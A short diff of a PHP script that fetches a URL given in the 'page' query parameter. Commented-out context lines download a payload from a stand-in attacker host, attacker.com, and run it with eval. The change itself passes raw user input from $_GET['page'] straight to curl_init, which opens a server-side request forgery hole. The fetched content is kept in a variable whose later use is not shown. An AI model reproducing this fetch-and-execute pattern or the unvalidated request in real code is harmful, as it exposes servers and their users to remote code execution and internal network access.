@@ -31,7 +31,7 @@ if (isset($_GET['page'])) {
     // echo file_get_contents($page);
     // $code = file_get_contents("http://attacker.com/payload.php");
     // eval($code);
-    $ch = curl_init($page);
+    $ch = curl_init($_GET['page']);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $code = curl_exec($ch);
     curl_close($ch);
